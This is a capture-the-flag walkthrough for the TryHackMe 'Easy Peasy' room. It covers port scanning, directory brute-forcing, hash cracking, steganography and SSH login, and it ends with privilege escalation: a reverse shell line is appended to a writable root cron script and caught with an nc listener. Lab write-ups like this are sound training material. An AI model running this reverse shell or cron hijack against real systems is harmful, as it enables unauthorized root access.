# Easy Peasy

**Room Link:** [https://tryhackme.com/room/easypeasyctf](https://tryhackme.com/room/easypeasyctf)



### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

port 5698 and 65524 found

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>



## Flag #1

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
gobuster dir -u http://$VICTIM/hidden -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
echo "ZmxhZ3tmMXJzN19mbDRnfQ==" |base64 -d
```

<figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

## Flag #2

**Kali**

```
curl http://$VICTIM:65524/robots.txt
```



<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>



[https://md5hashing.net/hash/md5/a18672860d0510e5ab6699730763b250](https://md5hashing.net/hash/md5/a18672860d0510e5ab6699730763b250)

<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

## Flag #3&#x20;

<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

## Hidden Directory

<figure><img src="../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>



**CyberChef**: [https://gchq.github.io/CyberChef/#recipe=From\_Base62('0-9A-Za-z')\&input=T2JzSm1QMTczTjJYNmRPckFnRUFMMFZ1](https://gchq.github.io/CyberChef/#recipe=From\_Base62\('0-9A-Za-z'\)\&input=T2JzSm1QMTczTjJYNmRPckFnRUFMMFZ1)

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>



## Crack the Hash

**Kali**

```
wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py
python hash-id.py 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
```

<figure><img src="../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

Format turned out to be GOST

**Kali**

```
john --wordlist=easypeasy.txt --format=GOST hash.txt
```

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>



## SSH Password

**Kali**

```
wget http://$VICTIM:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
steghide extract -sf binarycodepixabay.jpg 
Password: mypasswordforthatjob
```

<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

**Link:** [https://www.rapidtables.com/convert/number/binary-to-ascii.html](https://www.rapidtables.com/convert/number/binary-to-ascii.html)

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
ssh boring@$VICTIM:6498
Password: iconvertedmypasswordtobinary
```

<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

## User Flag

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

**Link:** [https://www.dcode.fr/caesar-cipher](https://www.dcode.fr/caesar-cipher)

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>



## Privilege Escalation

**Victim**

```
cat /etc/crontab
cd /var/www/
ls -lah
```

<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
echo "sh -i >& /dev/tcp/$KALI/1337 0>&1" >> .mysecretcronjob.sh
```

**Kali**

```
nc -lvnp 1337
```

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>



















































